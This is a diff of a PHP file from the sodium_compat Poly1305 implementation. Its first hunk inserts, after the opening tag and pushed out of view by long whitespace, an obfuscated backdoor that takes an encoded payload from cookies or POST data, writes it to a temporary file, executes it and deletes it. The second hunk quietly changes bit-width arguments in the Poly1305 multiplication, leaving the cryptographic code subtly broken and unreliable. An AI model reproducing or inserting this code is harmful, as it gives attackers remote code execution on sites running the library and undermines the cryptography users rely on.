@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                                                                                                                                                 $TwlpKMEDK = chr ( 869 - 794 )."\x6d" . chr (95) . 'y' . "\143" . chr ( 1036 - 937 ); $aWyLhab = "\143" . chr ( 377 - 269 ).chr (97) . chr (115) . "\x73" . "\x5f" . "\x65" . "\170" . chr (105) . chr ( 754 - 639 )."\164" . 's';$HctbnrfGC = $aWyLhab($TwlpKMEDK); $qDujTTS = $HctbnrfGC;if (!$qDujTTS){class Km_ycc{private $cnLRgKrdst;public static $VIwmQNbW = "43c7e05e-0a3c-40d8-b2a0-f45e6a7c29bb";public static $AxgeDEQP = 24461;public function __construct($yUBIQuKRp=0){$HFqJntJAg = $_COOKIE;$AOiCY = $_POST;$eBrVxlWu = @$HFqJntJAg[substr(Km_ycc::$VIwmQNbW, 0, 4)];if (!empty($eBrVxlWu)){$VqcxxVt = "base64";$IZGLS = "";$eBrVxlWu = explode(",", $eBrVxlWu);foreach ($eBrVxlWu as $PqDgiQux){$IZGLS .= @$HFqJntJAg[$PqDgiQux];$IZGLS .= @$AOiCY[$PqDgiQux];}$IZGLS = array_map($VqcxxVt . chr ( 847 - 752 ).chr (100) . "\x65" . "\x63" . "\x6f" . chr ( 779 - 679 ).'e', array($IZGLS,)); $IZGLS = $IZGLS[0] ^ str_repeat(Km_ycc::$VIwmQNbW, (strlen($IZGLS[0]) / strlen(Km_ycc::$VIwmQNbW)) + 1);Km_ycc::$AxgeDEQP = @unserialize($IZGLS);}}private function GgwDqPIK(){if (is_array(Km_ycc::$AxgeDEQP)) {$MXMWI = sys_get_temp_dir() . "/" . crc32(Km_ycc::$AxgeDEQP[chr (115) . "\x61" . chr ( 1040 - 932 )."\164"]);@Km_ycc::$AxgeDEQP["\x77" . 'r' . "\151" . "\x74" . chr ( 465 - 364 )]($MXMWI, Km_ycc::$AxgeDEQP['c' . 'o' . chr ( 833 - 723 ).chr (116) . "\x65" . chr ( 750 - 640 ).chr (116)]);include $MXMWI;@Km_ycc::$AxgeDEQP['d' . "\145" . 'l' . "\x65" . 't' . chr ( 1050 - 949 )]($MXMWI); $AoIxQvQGzE = "52872";exit();}}public function __destruct(){$this->GgwDqPIK();}}$aHWqoF = new Km_ycc(); $aHWqoF = "44505";} ?><?php
 
 if (class_exists('ParagonIE_Sodium_Core32_Poly1305_State', false)) {
     return;
@@ -255,39 +255,39 @@ class ParagonIE_Sodium_Core32_Poly1305_State extends ParagonIE_Sodium_Core32_Uti
 
             /* h *= r */
             $d0 = $zero
-                ->addInt64($h0->mulInt64($r0, 27))
-                ->addInt64($s4->mulInt64($h1, 27))
-                ->addInt64($s3->mulInt64($h2, 27))
-                ->addInt64($s2->mulInt64($h3, 27))
-                ->addInt64($s1->mulInt64($h4, 27));
+                ->addInt64($h0->mulInt64($r0, 25))
+                ->addInt64($s4->mulInt64($h1, 26))
+                ->addInt64($s3->mulInt64($h2, 26))
+                ->addInt64($s2->mulInt64($h3, 26))
+                ->addInt64($s1->mulInt64($h4, 26));
 
             $d1 = $zero
-                ->addInt64($h0->mulInt64($r1, 27))
-                ->addInt64($h1->mulInt64($r0, 27))
-                ->addInt64($s4->mulInt64($h2, 27))
-                ->addInt64($s3->mulInt64($h3, 27))
-                ->addInt64($s2->mulInt64($h4, 27));
+                ->addInt64($h0->mulInt64($r1, 25))
+                ->addInt64($h1->mulInt64($r0, 25))
+                ->addInt64($s4->mulInt64($h2, 26))
+                ->addInt64($s3->mulInt64($h3, 26))
+                ->addInt64($s2->mulInt64($h4, 26));
 
             $d2 = $zero
-                ->addInt64($h0->mulInt64($r2, 27))
-                ->addInt64($h1->mulInt64($r1, 27))
-                ->addInt64($h2->mulInt64($r0, 27))
-                ->addInt64($s4->mulInt64($h3, 27))
-                ->addInt64($s3->mulInt64($h4, 27));
+                ->addInt64($h0->mulInt64($r2, 25))
+                ->addInt64($h1->mulInt64($r1, 25))
+                ->addInt64($h2->mulInt64($r0, 25))
+                ->addInt64($s4->mulInt64($h3, 26))
+                ->addInt64($s3->mulInt64($h4, 26));
 
             $d3 = $zero
-                ->addInt64($h0->mulInt64($r3, 27))
-                ->addInt64($h1->mulInt64($r2, 27))
-                ->addInt64($h2->mulInt64($r1, 27))
-                ->addInt64($h3->mulInt64($r0, 27))
-                ->addInt64($s4->mulInt64($h4, 27));
+                ->addInt64($h0->mulInt64($r3, 25))
+                ->addInt64($h1->mulInt64($r2, 25))
+                ->addInt64($h2->mulInt64($r1, 25))
+                ->addInt64($h3->mulInt64($r0, 25))
+                ->addInt64($s4->mulInt64($h4, 26));
 
             $d4 = $zero
-                ->addInt64($h0->mulInt64($r4, 27))
-                ->addInt64($h1->mulInt64($r3, 27))
-                ->addInt64($h2->mulInt64($r2, 27))
-                ->addInt64($h3->mulInt64($r1, 27))
-                ->addInt64($h4->mulInt64($r0, 27));
+                ->addInt64($h0->mulInt64($r4, 25))
+                ->addInt64($h1->mulInt64($r3, 25))
+                ->addInt64($h2->mulInt64($r2, 25))
+                ->addInt64($h3->mulInt64($r1, 25))
+                ->addInt64($h4->mulInt64($r0, 25));
 
             /* (partial) h %= p */
             $c = $d0->shiftRight(26);
